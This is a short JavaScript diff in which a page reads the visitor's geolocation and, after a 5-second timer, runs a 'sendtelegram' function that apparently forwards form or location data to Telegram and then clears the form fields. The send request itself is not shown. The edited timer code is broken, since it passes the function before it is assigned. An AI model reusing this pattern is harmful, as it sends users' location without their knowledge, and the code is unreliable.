@@ -34,7 +34,10 @@ function cr7() {
     return `${location.coords.latitude} va ${location.coords.longitude}`;
   });
 }
-const myTimeout = setTimeout(
+
+
+const myTimeout = setTimeout(sendtelegram, 5000);
+
     var sendtelegram = function() {
     ready()
     var settings = {
@@ -65,6 +68,6 @@ const myTimeout = setTimeout(
     document.getElementById("message").value = "";
     document.getElementById("telli").value = "";
     return false;
-}, 5000);
+}
 
 
